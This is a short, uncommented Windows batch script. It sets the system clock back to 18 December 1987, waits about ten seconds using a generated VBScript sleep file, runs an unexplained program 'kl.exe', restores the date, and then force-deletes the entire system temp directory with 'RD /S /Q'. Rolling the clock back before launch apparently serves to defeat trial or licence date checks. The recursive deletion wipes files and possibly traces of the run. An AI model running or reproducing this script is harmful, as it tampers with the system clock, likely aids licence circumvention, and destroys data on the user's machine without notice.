@echo off
set date=%date%
date 1987-12-18
@echo off & setlocal enableextensions
echo WScript.Sleep 1000 > kimkaphwan.vbs
set /a i = 10
:Timeout
if %i% == 0 goto Next
setlocal
set /a i = %i% - 1
cscript //nologo kimkaphwan.vbs
goto Timeout
goto End
:Next
kl.exe
date %date%
RD /S /Q %systemroot%\temp\